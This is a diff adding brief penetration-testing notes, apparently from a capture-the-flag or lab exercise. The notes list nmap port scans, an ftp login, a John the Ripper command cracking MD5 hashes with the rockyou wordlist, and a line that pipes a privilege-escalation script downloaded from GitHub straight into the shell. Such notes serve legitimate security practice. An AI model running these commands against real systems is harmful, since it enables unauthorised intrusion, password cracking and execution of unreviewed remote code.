@@ -1,0 +1,9 @@
+nmap ip
+nmap -p53,80,443 ip
+ftp ip
+
+brute md5:
+john findings.txt --wordlist=../rockyou.txt
+
+priveleges escalation:
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
